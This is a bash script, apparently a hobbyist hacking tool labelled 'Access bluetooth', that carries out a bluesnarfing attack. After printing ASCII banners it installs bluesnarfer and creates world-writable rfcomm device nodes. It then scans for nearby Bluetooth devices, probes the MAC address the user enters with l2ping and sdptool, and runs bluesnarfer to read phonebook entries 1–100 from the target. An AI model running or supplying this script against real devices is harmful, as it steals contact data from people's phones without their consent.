#!/bin/bash
clear
printf "\e[1;92m  #########*   \e[0m\e[1;93m                   #########*\e[0m\n"
printf "\e[1;92m  #  #    #       # \e[0m\e[1;93m               #  #    #  \e[0m\n"
printf "\e[1;92m   # #   #        #\e[0m\e[1;93m                 # #   #\e[0m\n"
printf "\e[1;92m     #  #         #      *\e[0m\e[1;93m            #  #\e[0m\n"
printf "\e[1;92m     # #          #      #\e[0m\e[1;93m            # #              #\e[0m\n"
printf "\e[1;92m     #     ####################\e[0m\e[1;93m       #     ########### \e[0m\n"
printf "\e[1;92m     # #   #      #      #\e[0m\e[1;93m            # #   #      # #     # \e[0m\n"
printf "\e[1;92m     #  #  #      ########\e[0m\e[1;93m            #  #  #      ##    #\e[0m\n"
printf "\e[1;92m     #   # #      #      #\e[0m\e[1;93m            #   # #      # # #\e[0m\n"
printf "\e[1;92m     #    #########      #\e[0m\e[1;93m            #    ############\e[0m\n"
printf "\e[1;92m        #                 \e[0m\e[1;93m               #         #\e[0m\n"
printf "\e[1;92m      #                   \e[0m\e[1;93m             #         #\e[0m\n"
printf "\e[1;92m   *#                     \e[0m\e[1;93m           #         #\e[0m\n\n"
printf "                                                        Access bluetooth\n"
printf "                                                     Made by@:Chintu\n"

printf "\e[1;92m/==========================########========================\\  \e[0m\n"
printf "\e[1;92m|                             #				   |   \e[0m\n"
printf "\e[1;92m|             # Hacking is over vission & mission #        |   \e[0m\n"
printf "\e[1;92m|             	                 		           |   \e[0m\n"
printf "\e[1;92m|         # Tested on Kali Linux, Parrot and BlackArch #   |   \e[0m\n"
printf "\e[1;92m|                     					   |   \e[0m\n"
printf "\e[1;92m|———————————#—————————————————#——————————————————#—————————|   \e[0m\n"
printf "\e[1;92m|                                               Anonymous ||  \e[0m\n"
printf "\e[1;92m\==========================================================/   \e[0m\n"
printf "\n"
printf "Relex...\n"
sleep 5
printf "Script is runnining...\n"
apt-get install bluesnarfer >/dev/null
sleep 5
mkdir -p /dev/bluetooth/rfcomm
mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0
mknod --mode=666 /dev/rfcomm0 c 216 0
hciconfig -a hci0 up
hciconfig hci0
sleep 1
printf "\e[1;92m	  Mac Address           Device Name\e[0m\n"
timeout 30s hcitool scan
printf "\e[1;92m[\e[0m\e[1;77m>>>\e[0m\e[1;92m]\e[0m\e[1;93mEnter the device mac address: \e[0m"
read mac
timeout 5s l2ping $mac
sdptool browse --tree --l2cap $mac >/dev/null
printf "\e[1;92m[\e[0m\e[1;77m>>>\e[0m\e[1;92m]\e[0m\e[1;93mEnter the device mac address again:\e[0m"
read rock
sleep 5
printf "\e[1;92m Check your Bluetooth setting\e[0m\n" 
bluesnarfer -r 1-100 -c 6 -b $rock


